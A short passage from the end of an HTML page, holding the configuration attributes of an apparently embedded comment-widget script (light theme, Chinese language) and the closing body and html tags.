    data-category-id="DIC_kwDOMfB-Wc4ChZUZ"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="light"
    data-lang="zh-CN"
    crossorigin
    async
></script>





    
</body>
</html>
